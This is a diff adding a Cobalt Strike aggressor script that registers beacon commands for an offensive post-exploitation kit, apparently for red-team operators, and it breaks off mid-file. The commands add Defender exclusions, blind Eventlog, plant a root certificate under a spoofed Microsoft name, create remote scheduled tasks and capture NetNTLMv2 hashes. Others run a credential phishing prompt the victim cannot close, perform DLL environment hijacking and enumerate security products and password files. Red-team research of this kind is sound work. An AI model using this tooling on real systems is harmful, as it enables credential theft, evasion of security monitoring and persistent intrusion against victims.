@@ -1,0 +1,1112 @@
+# author REDMED-X
+# Master CNA to load all Beacon Object Files from the OperatorsKit.
+
+
+beacon_command_register(
+	"addexclusion", "Add a new exclusion to Windows Defender for a folder, file, process or extension.",
+	"INFO:\nAdd a new exclusion to Windows Defender for a folder, file, process or extension.\n\n" .
+	"ARGUMENTS:\n[<exclusion type>]: specify one of the following exclusion types: path (file/folder), process, extension.\n[<exclusion data>]: specify the data to add as an exclusion.\n\n" .
+	"USAGE:\naddexclusion <exclusion type> <exclusion data>\n\n" .
+	"EXAMPLES:\naddexclusion path C:\\Users\\Public\\Downloads\naddexclusion process C:\\Windows\\System32\\example.exe\naddexclusion extension *.xll\n\n");
+	
+alias addexclusion {
+    $bid = $1;
+    $excltype = $2;
+    $excldata = $3;
+
+    if ($excltype eq "") {
+        berror($bid, "Please specify one of the following extension types: path | process | extension.\n");
+        return;
+    }
+
+    if ($excltype eq "path" || $excltype eq "process" || $excltype eq "extension") {
+        if ($excldata eq "") {
+            berror($bid, "Please specify the data to add as an exclusion.\n");
+            return;
+        }
+    }
+    else {
+        berror($bid, "This exclusion type isn't supported. Please specify one of the following options: path | process | extension.\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/AddExclusion/addexclusion.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "zZ", $excltype, $excldata);
+
+    blog($bid, "Tasked to add a new exclusion..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"addfirewallrule", "Add a new inbound/outbound firewall rule.",
+	"INFO:\nAdd a new inbound/outbound firewall rule using COM.\n\n" .
+	"ARGUMENTS:\n[<direction>]: specify \"in\" for inbound or \"out\" for outbound.\n[<port>]: specify a single port (80) or port range (80-1000)\n[<rule name>]: specify the name of the new rule.\n[<rule group>]: specify the name of the rule group OR leave empty.\n[<description>]: specify the description of the new rule OR leave empty.\n\n" .
+	"USAGE:\naddfirewallrule <direction> <port> \"<rule name>\" \"<rule group>\" \"<description>\"\n\n" .
+	"EXAMPLES:\naddfirewallrule in 80 \"ExampleRuleName1\" \"ExampleGroup1\" \"Test rule\"\naddfirewallrule out 80-1000 \"ExampleRuleName2\" \n\n");
+
+
+
+alias addfirewallrule {
+    $bid = $1;
+    $direction = $2;
+    $port = $3;
+    $name = $4;
+	$group = $5;
+	$description = $6;
+
+    if ($direction eq "") {
+        berror($bid, "Please specify one of the following rule options: in | out\n");
+        return;
+    }
+
+    if ($direction eq "in" || $direction eq "out") {
+        if ($port eq "") {
+            berror($bid, "Please specify a single port or port range.\n");
+            return;
+        }
+        if ($name eq "") {
+            berror($bid, "Please specify a name of the new firewall rule.\n");
+            return;
+        }
+    }
+    else {
+        berror($bid, "This option isn't supported. Please specify one of the following options: in | out\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/AddFirewallRule/addfirewallrule.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "zZZZZ", $direction, $port, $name, $group, $description);
+
+    blog($bid, "Tasked to add a new firewall rule..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"addlocalcert", "Add a self signed certificate to a specified local computer certificate store.",
+	"INFO:\nAdd a (self signed) certificate to a specified local computer certificate store. For example, add a certificate to the \"Trusted Root Certification Authorities\" (ROOT) folder on the local computer. All the properties are filled in based on the metadata in the certificate except the \"Friendly Name\" property. This property needs to be set manually as an argument.\n\n" .
+	"ARGUMENTS:\n[<path to certificate file>]: the path on your own attacker system to the certificate.cer file.\n[<store name>]: the certificate store name (like ROOT) to import the certificate into.\n[<friendly name>]: the name that is set in the \"Friendly Name\" property.\n\n" .
+	"USAGE:\naddlocalcert <path to certificate.cer file> <store name> \"<friendly name>\" \n\n" .
+	"EXAMPLES:\naddlocalcert C:\\Users\\operator\\Documents\\examplecert.cer ROOT \"Microsoft Root Certificate Authority 2010\"\n\n");
+	
+alias addlocalcert {
+    $bid = $1;
+	$path = $2;
+    $store = $3;
+	$name = $4;
+	
+	
+	if ($path eq "") {
+		berror($bid, "Please specify the path to the certicate.cer file on your own system.\n");
+		return;
+	}
+
+	if ($store eq "") {
+		berror($bid, "Please specify a valid local computer certificate store name like ROOT.\n");
+		return;
+	}
+	
+	# read in the certificate.cer file
+	$handle = openf("$path");
+	$certfile = readb($handle, -1);
+	closef($handle);
+	
+	blog($bid, "path: $+  $path");
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/AddLocalCert/addlocalcert.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data = bof_pack($bid, "bZz", $certfile, $store, $name);
+
+	blog($bid, "Tasked to add a certificate to a local computer store..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"addtaskscheduler", "Create a scheduled task (local and remote system support).",
+	"INFO:\nCreate a scheduled task on the current system or a remote host.\n\n" .
+	"BASIC ARGUMENTS:\n[taskName]: The name of the scheduled task.\n[hostName]: The FQDN of the remote host or \"\" for the current system.\n[programPath]: Path to the program that you want to run like: C:\\Windows\\System32\\cmd.exe.\n[programArguments]: Arguments that you want to pass to the program like: \"/c C:\\Windows\\System32\\calc.exe\" or \"\" to leave it empty.\n[triggerType]: The trigger that signals the execution like: onetime, daily, logon, startup, lock, unlock. For more information, check the TRIGGER OPTIONS below.\n\n" .
+	"TRIGGER OPTIONS:\n[onetime]: Create task with trigger \"On a schedule one time\".\n[daily]: Create task with trigger \"On a schedule daily.\"\n[logon]: Create task with trigger \"At log on\" (requires admin privs if set for another user or all users).\n[startup]: Create task with trigger \"At startup\" (requires admin privs).\n[lock]: Create task with trigger \"On workstation lock\" (requires admin privs if set for another user or all users).\n[unlock]: Create task with trigger \"On workstation unlock\" (requires admin privs if set for another user or all users).\n\n" .
+	"TRIGGER SPECIFIC ARGUMENTS:\n[startTime]: Start time of the trigger in format: 2023-03-24T12:08:00.\n[expireTime]: Expiration time of the trigger in format: 2023-03-24T12:08:00.\n[daysInterval]: Interval in number of days. For example: 1 or 3.\n[delay]: Random time delay after the start time in which the trigger is hit. Use format \"PT2H\" for hours and \"PT15M\" for minutes.\n[userID]: Specify the user for which the trigger is set in format: \"DOMAIN\\username\" for domain users, \"username\" for local system users and \"\" for all users (requires admin privs if set for another user or all users).\n[repeatTask]: Set \"Repeat task every x minutes/hours\" option in format \"PT2H\" with a duration of \"Indefinitely\".\n\n" .
+	"USAGE:\naddtaskscheduler <taskName> <(optional) hostName> <programPath> \"<(optional) programArguments>\" onetime <startTime> <(optional) repeatTask>\naddtaskscheduler <taskName> <(optional) hostName> <programPath> \"<(optional) programArguments>\" daily <startTime> <(optional) expireTime> <(optional) daysInterval> <(optional) delay>\naddtaskscheduler <taskName> <(optional) hostName> <programPath> \"<(optional) programArguments>\" logon <(optional) userID>\naddtaskscheduler <taskName> <(optional) hostName> <programPath> \"<(optional) programArguments>\" startup <(optional) delay>\naddtaskscheduler <taskName> <(optional) hostName> <programPath> \"<(optional) programArguments>\" lock <(optional) userID> <(optional) delay>\naddtaskscheduler <taskName> <(optional) hostName> <programPath> \"<(optional) programArguments>\" unlock <(optional) userID> <(optional) delay>\n\n" .
+	"EXAMPLES:\naddtaskscheduler TestTask \"\" C:\\Windows\\System32\\cmd.exe \"/c C:\\Windows\\System32\\calc.exe\" daily 2023-03-24T12:08:00 2023-03-28T12:14:00 1 PT2H\naddtaskscheduler NewTask DB01.example.local C:\\Users\\Public\\Downloads\\legit.exe \"\" logon Testdomain\\Administrator\naddtaskscheduler OneDrive \"\" C:\\Data\\OneDrive.exe \"\" unlock \"\" PT5M\n\n");
+	
+alias addtaskscheduler {
+    $bid = $1;
+	$taskName = $2; 
+	$host = $3; 
+    $programPath = $4;
+    $programArguments = $5;
+	$triggerType = $6; 
+	$optionalArg1 = $7;
+	$optionalArg2 = $8;
+	$optionalArg3 = $9;
+	$optionalArg4 = $10;
+
+
+	# Verify user input
+	if ($taskName eq "") {
+		berror($bid, "Please specify a name for the new scheduled task.\n");
+		return;
+	}
+	
+	if ($programPath eq "") {
+		berror($bid, "Please specify the path to the program that you want to run\n");
+		return;
+	}
+	
+	if ($triggerType eq "") {
+		berror($bid, "Please specify one of the following trigger options: onetime | daily | logon | startup | lock | unlock\n");
+		return;
+	}
+	
+	if ($triggerType eq "onetime" || $triggerType eq "daily" || $triggerType eq "logon" || $triggerType eq "startup" || $triggerType eq "lock" || $triggerType eq "unlock") {
+		if ($triggerType eq "onetime") {
+			if ($optionalArg1 eq "") {
+				berror($bid, "Please specify the start time of the task in the following format: 2023-03-24T12:08:00.\n");
+				return;
+			}
+		}
+		if ($triggerType eq "daily") {
+			if ($optionalArg1 eq "") {
+				berror($bid, "Please specify the start time of the task in the following format: 2023-03-24T12:08:00.\n");
+				return;
+			}
+		}
+	}
+	else {
+		berror($bid, "This trigger option is not supported. Please select one of the following options: onetime | daily | logon | startup | lock | unlock\n");
+		return;
+	}
+	
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/AddTaskScheduler/addtaskscheduler.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+
+	if ($triggerType eq "onetime") {
+		$arg_data  = bof_pack($bid, "ZZZZzZZ", $taskName, $host, $programPath, $programArguments, $triggerType, $optionalArg1, $optionalArg2);
+	}
+	if ($triggerType eq "daily") {
+		$arg_data  = bof_pack($bid, "ZZZZzZZiZ", $taskName, $host, $programPath, $programArguments, $triggerType, $optionalArg1, $optionalArg2, $optionalArg3, $optionalArg4);
+	}
+	if ($triggerType eq "logon") {
+		$arg_data  = bof_pack($bid, "ZZZZzZ", $taskName, $host, $programPath, $programArguments, $triggerType, $optionalArg1);
+	}
+	if ($triggerType eq "startup") {
+		$arg_data  = bof_pack($bid, "ZZZZzZ", $taskName, $host, $programPath, $programArguments, $triggerType, $optionalArg1);
+	}
+	if ($triggerType eq "lock") {
+		$arg_data  = bof_pack($bid, "ZZZZzZZ", $taskName, $host, $programPath, $programArguments, $triggerType, $optionalArg1, $optionalArg2);
+	}
+	if ($triggerType eq "unlock") {
+		$arg_data  = bof_pack($bid, "ZZZZzZZ", $taskName, $host, $programPath, $programArguments, $triggerType, $optionalArg1, $optionalArg2);
+	}
+
+	blog($bid, "Tasked to create scheduled task..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+
+}
+
+
+beacon_command_register(
+    "blindeventlog", "Blind Eventlog by suspending its threads.",
+    "INFO:\nBlind Eventlog by suspending its threads. This technique requires elevated privileges.\nBe aware that all events, from the period the threads were suspended, will be pushed to Eventlog the moment the threads are resumed.\n\nOPTIONS:\n[suspend]: find and suspend all Eventlog threads and disrupt its functionality\n[resume]: find and resume all Eventlog threads and restore its functionality\n\n" .
+    "USAGE:\nblindeventlog <suspend | resume>\n\n");
+
+
+alias blindeventlog {
+    $bid = $1;
+    $action = $2;
+
+    if ($action eq "suspend" || $action eq "resume") {
+    }
+    else {
+        berror($bid, "Please specify one of the following actions: suspend | resume\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/BlindEventlog/blindeventlog.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "z", $action);
+
+    blog($bid, "Tasked to interact with Eventlog..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+beacon_command_register(
+	"capturenetntlm", "Capture the NetNTLMv2 hash of the current user.",
+	"INFO:\nCapture the NetNTLMv2 hash of the current user. This is done by simulating a NTLM authentication exchange between a client and server to capture the NetNTLMv2 hash.\n\n" .
+	"USAGE:\ncapturenetntlm\n\n");
+	
+alias capturenetntlm {
+    $bid = $1;
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/CaptureNetNTLM/capturenetntlm.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	blog($bid, "Tasked to capture the current user's NetNTLMv2 hash..");
+    beacon_inline_execute($bid, $data, "go", $null);
+}
+
+
+
+beacon_command_register(
+	"credprompt", "Start custom Windows credential prompt.",
+	"INFO:\nStart Windows credential prompt in an attempt to capture user credentials. Entered credentials are returned as output. The prompt is persistent so the victim can't cancel/close the prompt or enter an empty password. Any user attempt to do so is shown in the output. Finally, a timer for the prompt is set to make sure the beacon will return at some point.\n\n" .
+	"ARGUMENTS:\n[<title>]: a custom window title.\n[<message>]: a custom message set in the window.\n[<timer>]: number in seconds after how long the prompt should auto close. Default is set to 60.\n\n" .
+	"USAGE:\ncredprompt <title> <message> <(optional) timer>\n\n" .
+	"EXAMPLES:\ncredprompt \"Microsoft Outlook\" \"Connecting to user@example.com\" 60\n\n");
+	
+alias credprompt {
+    $bid = $1;
+	$title = $2;
+    $message = $3;
+	$timer = $4;
+	
+	if ($title eq "") {
+		berror($bid, "Please give the window a custom title.\n");
+		return;
+	}
+
+	if ($message eq "") {
+		berror($bid, "Please give the window a custom message.\n");
+		return;
+	}
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/CredPrompt/credprompt.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data = bof_pack($bid, "ZZi", $title, $message, $timer);
+
+	blog($bid, "Tasked to start a credential prompt..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"delexclusion", "Delete an exclusion from Windows Defender for a folder, file, process or extension.",
+	"INFO:\nDelete an exclusion from Windows Defender for a folder, file, process or extension. \n\n" .
+	"ARGUMENTS:\n[<exclusion type>]: specify one of the following exclusion types you want to delete: path (file/folder), process, extension.\n[<exclusion name>]: specify the exclusion data/name that you want to delete.\n\n" .
+	"USAGE:\ndelexclusion <exclusion type> <exclusion data>\n\n" .
+	"EXAMPLES:\ndelexclusion path C:\\Users\\Public\\Downloads\ndelexclusion process C:\\Windows\\System32\\example.exe\n\n");
+	
+alias delexclusion {
+    $bid = $1;
+    $excltype = $2;
+    $excldata = $3;
+
+    if ($excltype eq "") {
+        berror($bid, "Please specify one of the following extension types: path | process | extension.\n");
+        return;
+    }
+
+    if ($excltype eq "path" || $excltype eq "process" || $excltype eq "extension") {
+        if ($excldata eq "") {
+            berror($bid, "Please specify the exclusion data/name that you want to delete.\n");
+            return;
+        }
+    }
+    else {
+        berror($bid, "This exclusion type isn't supported. Please specify one of the following options: path | process | extension.\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/DelExclusion/delexclusion.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "zZ", $excltype, $excldata);
+
+    blog($bid, "Tasked to add a new exclusion..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"delfirewallrule", "Delete a firewall rule.",
+	"INFO:\nDelete a firewall rule using COM.\n\n" .
+	"ARGUMENTS:\n[<rule name>]: the name of the firewall rule you want to delete.\n\n" .
+	"USAGE:\ndelfirewallrule \"<rule name>\"\n\n" .
+	"EXAMPLES:\ndelfirewallrule \"ExampleRuleName1\"\n\n");
+	
+alias delfirewallrule {
+    $bid = $1;
+    $name = $2;
+	
+    if ($name eq "") {
+        berror($bid, "Please specify the name of the firewall rule you want to delete.\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/DelFirewallRule/delfirewallrule.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "Z", $name);
+
+    blog($bid, "Tasked to delete a new firewall rule..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register(
+	"dellocalcert", "Delete a local computer certificate from a specific store.",
+	"INFO:\nDelete a local computer certificate from a specified store based on its unique thumbprint.\n\n" . 
+	"ARGUMENTS:\n[<store name>]: the name of the certificate store from which to delete the certificate.\n[<thumbprint>]: the thumbprint of the certificate that you want to delete in format (all caps): AABBCCDDEEFF00112233445566778899AABBCCDD.\n\n" .
+	"USAGE:\ndellocalcert <store name> <thumbprint>\n\n" .
+	"EXAMPLES:\ndellocalcert ROOT AABBCCDDEEFF00112233445566778899AABBCCDD\n\n");
+	
+alias dellocalcert {
+    $bid = $1;
+	$store = $2;
+    $thumbprint = $3;
+	
+	if ($store eq "") {
+		berror($bid, "Please specify a valid local computer certificate store name like ROOT.\n");
+		return;
+	}
+
+	if ($thumbprint eq "") {
+		berror($bid, "Please specify the thumbprint for the certificate that you want to delete from the store.\n");
+		return;
+	}
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/DelLocalCert/dellocalcert.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data  = bof_pack($bid, "Zz", $store, $thumbprint);
+
+	blog($bid, "Tasked to delete a certificate..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register(
+	"deltaskscheduler", "Delete a scheduled task (local and remote support).",
+	"INFO:\nDelete a scheduled task on the current system or a remote host.\n\n" .
+	"ARGUMENTS:\n[taskName]: The name of the scheduled task.\n[hostName]: The FQDN of the remote host or leave empty for the current system.\n\n" .
+	"USAGE:\ndeltaskscheduler <taskName> <(optional) hostName>\n\n" .
+	"EXAMPLES:\ndeltaskscheduler TestTask\ndeltaskscheduler TestTask DB01.example.local\n\n");
+	
+alias deltaskscheduler {
+    $bid = $1;
+	$taskName = $2; 
+	$host = $3; 
+
+	# Verify user input
+	if ($taskName eq "") {
+		berror($bid, "Please specify the name of the scheduled task that you want to delete.\n");
+		return;
+	}
+		
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/DelTaskScheduler/deltaskscheduler.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data = bof_pack($bid, "ZZ", $taskName, $host);
+    blog($bid, "Tasked to delete scheduled task..");
+
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"dllenvhijacking", "BOF implementation of DLL environment hijacking.",
+	"INFO:\nThis tool will setup a hidden file structure, move an already on disk present malicious proxy DLL to the new system32 folder, hide the proxy DLL, modify the SYSTEMROOT environment variable, run the vulnerable binary as a spoofed process to execute the malicious DLL, and reset the original SYSTEMROOT environment variable so the beacon keeps working as intended.\n\nOPTIONS:\n[<new sysroot dir>]: the new directory name as a path that will be used as the new SYSTEMROOT variable like C:\\Data\\ (make sure the directory path ends with \\).\n[<malicious DLL name>]: the name of the malicious DLL that will be loaded by the vulnerable binary (e.g. mswsock.dll).\n[<path to mal. DLL folder>]: the path on the target system to the folder were the malicious DLL is stored (don't add the DLL name and end the path with a \\).\n[<name of vulnerable binary>]: the name of the vulnerable binary that will be executed and loads the malicious DLL (e.g. hostname.exe).\n[<pid parent proc>]: the process ID of the parent process under which the vulnerable binary will run as a child.\n\n" .
+	"USAGE:\ndllenvhijacking <new sysroot dir> <malicious DLL name> <path to mal. DLL folder> <name of vulnerable binary> <pid parent proc>\n\n");
+
+
+alias dllenvhijacking {
+    $bid = $1;
+    $sysroot = $2;
+    $proxydll = $3;
+    $pathtodll = $4;
+    $vulnbinary = $5;
+    $pid = $6;
+
+    if ($sysroot eq "" || $proxydll eq "" || $pathtodll eq "" || $vulnbinary eq "" || $pid eq "") {
+        berror($bid, "Please make sure that all the arguments are filled in and correct!\n");
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/DllEnvHijacking/dllenvhijacking.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "ZZZzi", $sysroot, $proxydll, $pathtodll, $vulnbinary, $pid);
+
+    blog($bid, "Tasked execute DLL Environment hijacking..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"enumlocalcert", "List all the stored local computer certificates from a specific store.",
+	"INFO:\nList all the stored local computer certificates from a specific store. Common store names are: ROOT, MY, TRUST, CA, USERDS, AuthRoot, Disallowed.\n\n" .
+	"ARGUMENTS:\n[<store name>]: the name of the certificate store.\n\n" .
+	"USAGE:\nenumlocalcert <store name>\n\n" .
+	"EXAMPLES:\nenumlocalcert ROOT\n\n");
+	
+alias enumlocalcert {
+    $bid = $1;
+    $store = $2;
+
+	if ($store eq "") {
+		berror($bid, "Please specify a valid local computer certificate store name like ROOT.\n");
+		return;
+	}
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumLocalCert/enumlocalcert.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data  = bof_pack($bid, "Z", $store);
+
+	blog($bid, "Tasked to list certificates from the local computer store..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "enumsecproducts", "List security products running on the current- or remote host.",
+    "INFO:\nGet a list of security products like AV/EDR that are running on the current- or remote host. This is done by comparing running processes against a hardcoded list of 130 security products.\n\n" .
+	"ARGUMENTS:\n[hostname]: The FQDN or IP of the remote host OR leave empty for the current system.\n\n" .
+    "USAGE:\nenumsecproducts <(optional) hostname>\n\n" .
+	"EXAMPLES:\nenumsecproducts \nenumsecproducts WS01.example.local\n\n");
+
+
+alias enumsecproducts {
+    $bid = $1;
+    $remotehost = $2;
+
+    # read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumSecProducts/enumsecproducts.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # pack our arguments
+    $arg_data = bof_pack($bid, "z", $remotehost);
+
+    blog($bid, "Tasked to list running security products..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"enumshares", "List remote shares and there access level using a predefined list with hostnames.",
+	"INFO:\nList remote shares and there access level based on a list with predefined hostnames or IP addresses. The list is loaded from your own attacker system.\n\n" .
+	"ARGUMENTS:\n[<path to file>]: the path on your own attacker system to the file containing the list with predefined hostnames. Each hostname must be newline separated.\n\n" .
+	"USAGE:\nenumshares <path to hostname file>\n\n" .
+	"EXAMPLES:\nenumshares C:\\Users\\RTO\\Documents\\hostnames.txt\n\n");
+	
+alias enumshares {
+    $bid = $1;
+	$path = $2;
+	
+	if ($path eq "") {
+		berror($bid, "Please specify the path on your own attacker system to the file containing the list with newline separated hostnames.\n");
+		return;
+	}
+
+	# read in the .txt file
+	$handle = openf("$path");
+	$file = readb($handle, -1);
+	closef($handle);
+	
+	blog($bid, "path: $+  $path");
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumShares/enumshares.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data = bof_pack($bid, "b", $file);
+
+	blog($bid, "Tasked to enumerate remote shares..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"enumtaskscheduler", "Enumerate and list all the scheduled tasks in the root folder.",
+	"INFO:\nEnumerate and list all the scheduled tasks in the root folder.\n\n" .
+	"ARGUMENTS:\n[hostName]: The FQDN of the remote host or \"\" for the current system.\n\n" .
+	"USAGE:\nenumtaskscheduler <(optional) hostName>\n\n" .
+	"EXAMPLES:\nenumtaskscheduler \nenumtaskscheduler DB01.example.local\n\n");
+	
+alias enumtaskscheduler {
+    $bid = $1;
+	$host = $2; 
+
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumTaskScheduler/enumtaskscheduler.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+
+	$arg_data  = bof_pack($bid, "Z", $host);
+
+	blog($bid, "Tasked to enumerate scheduled tasks in the root folder..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"enumwsc", "List what security products are registered in Windows Security Center.\n",
+	"INFO:\nGet a list of security products (antivirus, firewall, antispyware) that are registered in Windows Security Center. This only works if WSC is running (typically only on Windows clients).\n\n" .
+	"ARGUMENTS:\n[option]: specify one of the following options to request related security information from WSC: av (antivirus), fw (firewall), as (antispyware).\n\n" .
+	"USAGE:\nenumwsc <option>\n\n" .
+	"EXAMPLES:\nenumwsc av\n\n");
+	
+alias enumwsc {
+    $bid = $1;
+    $option = $2;
+
+	# Verify user input
+	if ($option eq "") {
+		berror($bid, "Please specify one of the following options: av | fw | as\n");
+		return;
+	}
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumWSC/enumwsc.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data  = bof_pack($bid, "z", $option);
+	
+	blog($bid, "Tasked to enumerate security products registered in Windows Security Center..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "enumdotnet", "Find processes that most likely have .NET loaded.",
+    "INFO:\nFind processes that most likely have .NET loaded by searching for the section name: \BaseNamedObjects\Cor_Private_IPCBlock(_v4)_<ProcessId>\n\n" .
+    "USAGE:\nenumdotnet\n\n");
+
+
+alias enumdotnet {
+    $bid = $1;
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumDotnet/enumdotnet.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    blog($bid, "Tasked to search for processes that have .NET loaded..");
+
+    beacon_inline_execute($bid, $data, "go", $null);
+}
+
+
+beacon_command_register(
+	"enumexclusions", "Check the AV for excluded files, folders, extentions and processes.",
+	"INFO:\nCheck the AV for excluded files, folders, extentions and processes. Currently only Windows Defender exclusions are supported.\n\n" .
+	"USAGE:\nenumexclusions\n\n");
+	
+alias enumexclusions {
+    $bid = $1;
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumExclusions/enumexclusions.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid);
+
+    blog($bid, "Tasked to enumerate exclusions..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "enumfiles", "Search for matching files based on a word, extention or keyword.",
+    "INFO:\nSearch for matching files based on a word, extention or keyword in the file content. Wildcards are supported . Keyword matching only works for text based files.\n\n" .
+	"ARGUMENTS:\n[<path to directory>]: specify a path to the directory from which to start searching (recursive searching supported).\n[<search pattern>]: specify a single word or extention to search for (support wildcards).\n[<keyword>]: leave empty OR specify a keyword to search for in text based files (support wildcards).\n\n" .
+	"USAGE:\nenumfiles <path to directory> <search pattern> <(optional) keyword> \n\n" .
+	"EXAMPLES:\nenumfiles C:\\Users\\RTO\\Documents *.xlsx\nenumfiles C:\\Users\\RTO *login*.* username\nenumfiles C:\\Users\\RTO *.txt *pass*\n\n");
+
+
+alias enumfiles {
+    $bid = $1;
+	$lpDirectory = $2;
+    $lpSearchPattern = $3;
+    $keyword = $4;
+
+    if ($lpDirectory eq "") {
+        berror($bid, "Please specify a path to a directory.\n");
+        return;
+    }
+
+    if ($lpSearchPattern eq "") {
+        berror($bid, "Please specify a pattern/word to search for.\n");
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumFiles/enumfiles.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "zzz", $lpDirectory, $lpSearchPattern, $keyword);
+
+    blog($bid, "Tasked to search for matching files..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "enumhandles", "Find process and thread handle types between processes.",
+    "INFO:\nFind process and thread handle types between processes.\n\nOPTIONS:\n[all]: list all processes with handles to all other processes\n[h2p]: list all processes that have a handle to a specific process\n[p2h]: list handles from a specific process to all other processes\n\nHandle Query Options:\n[proc]: search for PROCESS type handles\n[thread]: search for THREAD type handles\n\nTargeted Search Options:\n[<pid>]: for both the [h2p] and [p2h] search options, specify the PID of the process your interested in.\n\n" .
+    "USAGE:\nenumhandles all <proc | thread>\nenumhandles h2p <proc | thread> <pid>\nenumhandles p2h <proc | thread> <pid>\n\n");
+
+
+alias enumhandles {
+    $bid = $1;
+    $search = $2;
+    $query = $3;
+    $pid = $4;
+
+    if ($search eq "") {
+        berror($bid, "Please specify one of the following seach options: all | h2p | p2h\n");
+        return;
+    }
+
+    if ($search eq "all" || $search eq "h2p" || $search eq "p2h") {
+        if ($query eq "") {
+            berror($bid, "Please specify one of the following handle types to search for: proc | thread\n");
+            return;
+        }
+        if ($query eq "proc" || $query eq "thread") {
+            if ($search eq "h2p" && $pid eq "" ) {
+                berror($bid, "Please specify the pid to target a specific process.\n");
+                return;
+            }
+            if ($search eq "p2h" && $pid eq "" ) {
+                berror($bid, "Please specify the pid to target a specific process.\n");
+                return;
+            }
+        }
+        else {
+            berror($bid, "This handle type isn't supported. Please specify one of the following handle types to search for: proc | thread\n");
+            return;
+        }
+    }
+    else {
+        berror($bid, "This option isn't supported. Please specify one of the following seach options: all | h2p | p2h\n");
+        return;
+    }
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumHandles/enumhandles.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    if ($pid eq "") {
+        $arg_data  = bof_pack($bid, "zz", $search, $query);
+    }
+    else {
+        $arg_data  = bof_pack($bid, "zzi", $search, $query, $pid);
+    }
+
+    blog($bid, "Tasked to enumerate handles..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "enumlib", "Find loaded module(s) in remote process(es)",
